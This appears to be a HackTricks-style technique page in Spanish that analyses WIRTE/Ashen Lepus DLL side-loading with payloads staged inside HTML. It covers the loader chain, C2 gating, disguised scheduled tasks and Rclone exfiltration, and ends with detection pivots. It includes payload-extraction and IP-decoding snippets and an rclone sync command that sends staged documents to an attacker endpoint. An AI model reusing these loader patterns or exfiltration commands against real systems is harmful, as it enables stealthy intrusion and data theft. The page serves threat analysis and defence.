# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Resumen de la técnica

Ashen Lepus (aka WIRTE) weaponizó un patrón repetible que encadena DLL sideloading, staged HTML payloads y modular .NET backdoors para persistir dentro de redes diplomáticas de Oriente Medio. La técnica es reutilizable por cualquier operador porque se basa en:

- **Ingeniería social basada en archivos comprimidos**: PDFs benignos instruyen a los objetivos a descargar un archivo RAR desde un sitio de file-sharing. El archivo incluye un EXE de visor de documentos que parece real, una DLL maliciosa nombrada como una biblioteca confiable (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) y un `Document.pdf` señuelo.
- **Abuso del orden de búsqueda de DLL**: la víctima hace doble clic en el EXE, Windows resuelve la importación de la DLL desde el directorio actual, y el loader malicioso (AshenLoader) se ejecuta dentro del proceso confiable mientras el PDF señuelo se abre para evitar sospechas.
- **Staging living-off-the-land**: cada etapa posterior (AshenStager → AshenOrchestrator → modules) se mantiene fuera del disco hasta que se necesita, entregada como blobs cifrados ocultos dentro de respuestas HTML por lo demás inocuas.

## Cadena multi-stage de side-loading

1. **EXE señuelo → AshenLoader**: el EXE side-loads AshenLoader, que realiza host recon, lo cifra con AES-CTR y lo envía en POST dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` hacia rutas que parecen de API (p. ej., `/api/v2/account`).
2. **Extracción HTML**: el C2 solo delata la siguiente etapa cuando la IP del cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, frustrando sandboxes. Cuando las comprobaciones pasan, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload AshenStager cifrado con Base64/AES-CTR.
3. **Segundo sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario obtiene más HTML, esta vez recortando `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular .NET que decodifica una config JSON en Base64. Los campos `tg` y `au` de la config se concatenan/se hashean para formar la AES key, que descifra `xrk`. Los bytes resultantes actúan como una XOR key para cada blob de module obtenido después.
5. **Entrega de módulos**: cada module se describe mediante comentarios HTML que redirigen el parser a una etiqueta arbitraria, rompiendo reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) y file exploration (`FE`).

### Patrón de análisis de contenedor HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.

### Ayudante de extracción rápida (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelismos de evasión de HTML Staging

Investigaciones recientes sobre HTML smuggling (Talos) destacan payloads ocultos como cadenas Base64 dentro de bloques `<script>` en adjuntos HTML y decodificados mediante JavaScript en tiempo de ejecución. El mismo truco puede reutilizarse para respuestas de C2: hacer stage de blobs cifrados dentro de una etiqueta script (u otro elemento DOM) y decodificarlos en memoria antes de AES/XOR, haciendo que la página parezca HTML ordinario. Talos también muestra ofuscación por capas (renombrado de identificadores más Base64/Caesar/AES) dentro de etiquetas script, lo que encaja perfectamente con blobs C2 staged en HTML. Un informe posterior de Talos sobre **hidden text salting** también es relevante aquí: dividir Base64 con comentarios HTML irrelevantes o espacios en blanco basta para romper extractores regex simples, mientras que la reconstrucción del lado del navegador sigue siendo trivial.

## Notas de variantes recientes (2024-2025)

- Check Point observó campañas de WIRTE en 2024 que seguían basándose en sideloading a través de archivos, pero usaban `propsys.dll` (stagerx64) como primera etapa. El stager decodifica el siguiente payload con Base64 + XOR (clave `53`), envía solicitudes HTTP con un `User-Agent` codificado de forma fija y extrae blobs cifrados incrustados entre etiquetas HTML. En una rama, la etapa se reconstruía a partir de una larga lista de cadenas IP incrustadas decodificadas mediante `RtlIpv4StringToAddressA`, y luego concatenadas en los bytes del payload.
- OWN-CERT documentó herramientas anteriores de WIRTE donde el dropper cargado lateralmente `wtsapi32.dll` protegía cadenas con Base64 + TEA y usaba el propio nombre de la DLL como clave de descifrado, y luego ofuscaba con XOR/Base64 los datos de identificación del host antes de enviarlos al C2.

## Reconstrucción de etapas codificadas como IP

La rama `propsys.dll` de WIRTE en 2024 muestra que el siguiente PE no necesita residir como un único blob HTML contiguo. El loader puede almacenar los bytes de la etapa como cadenas dotted-quad y reconstruirlos con `RtlIpv4StringToAddressA`, un patrón estrechamente relacionado con la técnica **IPfuscation** de Hive. Operativamente, esto es útil cuando el actor quiere que la página HTML contenga algo que parezca IOCs inocuos o datos de configuración, en lugar de un payload Base64 obvio.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Si los bytes recuperados comienzan con `MZ`, probablemente reconstruiste el siguiente PE directamente. Si no, comprueba si hay una capa XOR/Base64 inicial o pequeños fragmentos delimitadores entre direcciones.

## Nombres de DLL intercambiables y rotación de host

Una propiedad fuerte de este patrón es que el **backend de staging HTML/AES/XOR puede permanecer idéntico mientras solo cambia el par de sideload**. WIRTE rotó entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` y `propsys.dll` a lo largo de varias campañas, lo cual es útil porque:

- `propsys.dll` y `wtsapi32.dll` son nombres de DLL de Windows poco llamativos que los defensores esperan que existan en `%System32%` / `%SysWOW64%`.
- Catálogos públicos como **HijackLibs** ya mapean muchos binarios que cargarán esos nombres de DLL desde un directorio de aplicación copiado, dando a los operadores hosts de reemplazo sin rediseñar el stager.
- Solo la superficie de exportación debe adaptarse por host. El parser HTML, las rutinas AES/XOR y el cargador de módulos normalmente pueden portarse sin cambios a una DLL proxy de forwarding.

Para trabajo ofensivo de laboratorio, esto significa que puedes separar el problema en **(1) encontrar un host firmado estable que resuelva localmente el nombre de DLL elegido** y **(2) reutilizar la misma lógica de loader HTML staged detrás de esa DLL**.

## Fortalecimiento de Crypto y C2

- **AES-CTR en todas partes**: los loaders actuales incrustan claves de 256 bits más nonces (p. ej., `{9a 20 51 98 ...}`) y, opcionalmente, añaden una capa XOR usando cadenas como `msasn1.dll` antes/después de la desencriptación.
- **Variaciones de material de clave**: loaders anteriores usaban Base64 + TEA para proteger cadenas incrustadas, con la clave de desencriptación derivada del nombre de la DLL maliciosa (p. ej., `wtsapi32.dll`).
- **Separación de infraestructura + camuflaje de subdominios**: los servidores de staging se separan por herramienta, se alojan en ASN variables y a veces se sitúan detrás de subdominios que parecen legítimos, de modo que quemar una etapa no expone el resto.
- **Contrabando de recon**: los datos enumerados ahora incluyen listados de Program Files para detectar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **Rotación de URI**: los parámetros de consulta y las rutas REST rotan entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecciones frágiles.
- **Fijación de User-Agent + redirecciones seguras**: la infraestructura C2 responde solo a cadenas UA exactas y, en caso contrario, redirige a sitios benignos de noticias/salud para mezclarse con el tráfico.
- **Entrega con gating**: los servidores tienen geo-fencing y solo responden a implantes reales. Los clientes no aprobados reciben HTML no sospechoso.

## Persistencia y bucle de ejecución

AshenStager deja tareas programadas que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan mediante `svchost.exe`, por ejemplo:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas relanzan la cadena de sideloading al arrancar o a intervalos, asegurando que AshenOrchestrator pueda solicitar módulos nuevos sin tocar el disco de nuevo.

## Uso de clientes de sincronización benignos para exfiltración

Los operadores preparan documentos diplomáticos dentro de `C:\Users\Public` (legible por todos y no sospechoso) mediante un módulo dedicado, y luego descargan el binario legítimo [Rclone](https://rclone.org/) para sincronizar ese directorio con almacenamiento del atacante. Unit42 señala que esta es la primera vez que se ha observado a este actor usando Rclone para exfiltración, alineándose con la tendencia general de abusar de herramientas legítimas de sincronización para mezclarse con el tráfico normal:

1. **Stage**: copiar/recolectar los archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configurar**: enviar una configuración de Rclone apuntando a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. **Sincronizar**: ejecutar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se parezca a copias de seguridad normales en la nube.

Como Rclone se usa ampliamente para flujos de backup legítimos, los defensores deben centrarse en ejecuciones anómalas (binarios nuevos, remotes extraños o sincronización repentina de `C:\Users\Public`).

## Pivotes de detección

- Alertar sobre **procesos firmados** que cargan inesperadamente DLLs desde rutas escribibles por el usuario (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de DLL coinciden con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.
- Inspeccionar respuestas HTTPS sospechosas en busca de **grandes blobs Base64 incrustados dentro de tags inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Normalizar HTML primero: **eliminar comentarios y colapsar espacios en blanco antes de extraer Base64**, porque la evasión estilo hidden-text-salting puede dividir payloads entre límites de comentarios.
- Extender la búsqueda de HTML a **cadenas Base64 dentro de bloques `<script>`** (staging estilo HTML smuggling) que se decodifican mediante JavaScript antes del procesamiento AES/XOR.
- Buscar llamadas repetidas a **`RtlIpv4StringToAddressA` seguidas de ensamblado de buffer**, especialmente cuando las cadenas alrededor son listas largas de IPv4 en lugar de objetivos de red reales.
- Buscar **tareas programadas** que ejecuten `svchost.exe` con argumentos no relacionados con servicios o que apunten de vuelta a directorios de dropper.
- Seguir **redirecciones C2** que solo devuelven payloads para cadenas exactas de `User-Agent` y, en caso contrario, rebotan hacia dominios legítimos de noticias/salud.
- Monitorizar binarios de **Rclone** que aparezcan fuera de ubicaciones gestionadas por IT, nuevos archivos `rclone.conf` o trabajos de sync que extraigan desde directorios de staging como `C:\Users\Public`.

## Referencias

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
